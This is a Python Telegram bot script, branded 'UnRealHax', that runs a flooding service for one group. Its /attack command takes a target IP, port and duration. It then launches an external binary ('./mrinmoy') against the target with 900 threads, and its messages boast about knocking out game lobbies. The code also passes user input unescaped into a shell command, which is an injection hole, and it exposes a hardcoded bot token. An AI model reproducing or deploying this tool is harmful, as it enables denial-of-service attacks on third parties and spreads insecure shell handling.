import telebot
import asyncio
import time
import threading

TELEGRAM_BOT_TOKEN = '7553836250:AAHNonairCAy6FIOrqAit5ONly-JBUymbqY'
ALLOWED_GROUP_ID = -1002188853622  # Replace with your group's ID
COOLDOWN_TIME = 60  # Cooldown duration in seconds
cooldowns = {}
GROUP_LINK = "pampa"

bot = telebot.TeleBot(TELEGRAM_BOT_TOKEN)

@bot.message_handler(commands=['start'])
def start(message):
    if message.chat.id != ALLOWED_GROUP_ID:
        bot.send_message(
            message.chat.id,
            f"*⚠️ Please use commands in the specific group only.*\n\n"
            f"Join the group here: [{GROUP_LINK}]({GROUP_LINK})",
            parse_mode='Markdown'
        )
        return

    bot.send_message(
        message.chat.id,
        "*🔥 Welcome to the UnRealHax 🔥*\n"
        "*Use /attack <ip> <port> <duration>*\n"
        "*Let Start Fucking ⚔️💥*",
        parse_mode='Markdown'
    )

def run_attack_thread(chat_id, ip, port, duration):
    asyncio.run(run_attack(chat_id, ip, port, duration))

async def run_attack(chat_id, ip, port, duration):
    try:
        process = await asyncio.create_subprocess_shell(
            f"./mrinmoy {ip} {port} {duration} 900",
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE
        )
        stdout, stderr = await process.communicate()

        if stdout:
            print(f"[stdout]\n{stdout.decode()}")
        if stderr:
            print(f"[stderr]\n{stderr.decode()}")

    except Exception as e:
        bot.send_message(chat_id, f"*⚠️ Error during the attack: {str(e)}*", parse_mode='Markdown')

    finally:
        bot.send_message(chat_id, "*✅ Attack Completed! ✅*\n*Thank you for using our Free service!*", parse_mode='Markdown')

@bot.message_handler(commands=['attack'])
def attack(message):
    global cooldowns

    if message.chat.id != ALLOWED_GROUP_ID:
        bot.send_message(
            message.chat.id,
            "*⚠️ Please use commands in the specific group only.*",
            parse_mode='Markdown'
        )
        return

    user_id = str(message.from_user.id)
    args = message.text.split()[1:]

    if user_id in cooldowns:
        remaining_time = int(cooldowns[user_id] - time.time())
        if remaining_time > 0:
            bot.send_message(
                message.chat.id,
                f"*⚠️ You are on cooldown. Please wait {remaining_time} seconds before attacking again.*",
                parse_mode='Markdown'
            )
            return

    if len(args) != 3:
        bot.send_message(
            message.chat.id,
            "*⚠️ Usage: /attack <ip> <port> <duration>*",
            parse_mode='Markdown'
        )
        return

    ip, port, duration = args

    try:
        duration = int(duration)
        if duration > 300:
            duration = 300
    except ValueError:
        bot.send_message(
            message.chat.id,
            "*⚠️ Duration must be a number.*",
            parse_mode='Markdown'
        )
        return

    bot.send_message(
        message.chat.id,
        f"*⚔️ Attack Launched! ⚔️*\n"
        f"*🎯 Target: {ip}:{port}*\n"
        f"*🕒 Duration: {duration} seconds*\n"
        f"*🔥 Enjoy And Fuck Whole Lobby 💥*",
        parse_mode='Markdown'
    )

    cooldowns[user_id] = time.time() + COOLDOWN_TIME

    # Run each attack in a separate thread
    attack_thread = threading.Thread(target=run_attack_thread, args=(message.chat.id, ip, port, duration))
    attack_thread.start()

if __name__ == '__main__':
    bot.polling(none_stop=True)
    